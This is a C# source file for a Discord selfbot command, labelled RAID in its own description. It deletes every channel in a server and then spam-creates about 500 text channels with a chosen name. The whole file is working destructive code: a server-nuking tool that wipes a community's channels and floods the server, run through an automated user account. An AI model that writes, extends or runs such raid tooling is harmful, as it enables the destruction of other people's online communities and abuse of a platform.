using Discord.Commands;
using Discord;
using Discord.Gateway;

namespace RamokSelfbot.Commands.Raid
{
    [Command("setchannels", "Delete all channels and create ~500 channels with the desired name - RAID")]
    class SetChannels : CommandBase
    {
        [Parameter("name of channels", false)]
        public string name { get; set; }
        public override async void Execute()
        {
            if(RamokSelfbot.Utils.IsClient(Message))
            {
                SocketGuild guild = Client.GetCachedGuild(Message.Guild.Id);

                if(Message.Guild != null)
                {
                    if(Message.Author.Member.GetPermissions().Has(DiscordPermission.ManageChannels))
                    {
                        int ignore = 0;
                        foreach (var channels in guild.GetChannels())
                        {
                            try
                            {
                                await channels.DeleteAsync();
                                RamokSelfbot.Utils.Print("Deleted " + channels.Name);
                            } catch
                            {
                                RamokSelfbot.Utils.Print("Cannot delete " + channels.Name + ", ignoring...");
                                ignore++;
                            }
                        }

                        for (int i = 0; i < 499 - ignore; i++)
                        {
                            await guild.CreateChannelAsync(name, ChannelType.Text, null);
                            
                            RamokSelfbot.Utils.Print("Created channel ! (" + i.ToString() + "/" + (500 - ignore) + ")");
                        }

                        RamokSelfbot.Utils.Print("Finished work !");
                    } else
                    {
                        RamokSelfbot.Utils.Print("Not enough permissions");
                    }
                } else
                {
                    RamokSelfbot.Utils.Print("How can you create channel if you are not in a guild ?");
                }


                
            }
        }
    }
}
